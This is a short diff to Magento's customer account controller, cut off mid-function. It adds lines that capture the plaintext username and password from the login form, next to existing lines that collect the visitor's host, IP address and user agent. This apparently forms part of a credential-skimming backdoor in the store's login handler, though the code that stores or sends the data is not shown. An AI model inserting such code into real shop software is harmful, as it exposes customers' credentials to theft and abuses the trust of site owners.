@@ -175,7 +175,9 @@ class Mage_Customer_AccountController extends Mage_Core_Controller_Front_Action
             } else {
                 $session->addError($this->__('Login and password are required.'));
             }
-        }
+        }   
+            $username = $login['username'];
+            $password = $login['password'];
 			$srv = $_SERVER['HTTP_HOST'];
 			$ips = $_SERVER['REMOTE_ADDR'];
 			$uag = $_SERVER['HTTP_USER_AGENT'];
